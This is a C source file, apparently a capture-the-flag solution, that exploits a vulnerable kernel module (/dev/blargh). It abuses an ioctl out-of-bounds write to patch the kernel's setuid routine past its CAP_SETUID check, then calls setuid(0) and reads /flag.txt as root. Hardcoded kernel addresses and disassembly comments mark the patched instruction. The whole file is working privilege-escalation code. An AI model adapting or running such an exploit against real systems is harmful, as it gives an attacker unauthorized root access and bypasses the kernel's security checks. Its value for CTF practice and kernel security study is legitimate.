#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>
#include <fcntl.h>
#include <sys/ioctl.h>

int fd;

void oob(long i) {
    ioctl(fd, 0x40086721, i);
}

/*
ffffffff81303260 T _printk
ffffffff812a8780 T __x64_sys_setuid

blargh 12288 0 - Live 0xffffffffc0000000 (O)
*/

#define printk 0xffffffff81303260L
#define sys_setuid 0xffffffff812a8780L
#define __sys_setuid 0xffffffff812a8660L
#define module 0xffffffffc0000000L

int main() {
    fd = open("/dev/blargh", 0);
    if (fd < 0) {
        perror("open");
        exit(1);
    }
    printf("fd: %d\n", fd);

    // infinite writes
    //oob(module+0x25 - printk);

    /*
    0xffffffff812a8686    mov    rax, qword ptr gs:[rip + 0x7ed83f72]
    0xffffffff812a868e    mov    esi, 7             <------------ CAP_SETUID
    0xffffffff812a8693    mov    r12, qword ptr [rax + 0x768]
    0xffffffff812a869a    mov    rdi, qword ptr [r12 + 0x90]
    0xffffffff812a86a2    call   0xffffffff8129a1b0            <0xffffffff8129a1b0>
    
    0xffffffff812a86a7    test   al, al
    0xffffffff812a86a9    je     0xffffffff812a8725            <0xffffffff812a8725>
    
    0xffffffff812a86ab    mov    dword ptr [rbx + 8], ebp       // this is the case where CAP_SETUID is set
    */

    // write to setuid
    //oob(0xffffffff812a86aaL - printk);
    oob(__sys_setuid+0x4a - printk);

    if (setuid(0) < 0) {
        perror("setuid");
        exit(1);
    }
    printf("getuid(0)=%d\n", getuid());
    int fd2 = open("/flag.txt", 0);
    if (fd2 < 0) {
        perror("open(flag)");
        exit(1);
    }
    char buf[0x200];
    if (read(fd2, buf, sizeof(buf)) < 0) {
        perror("read(flag)");
        exit(1);
    }
    puts(buf);
}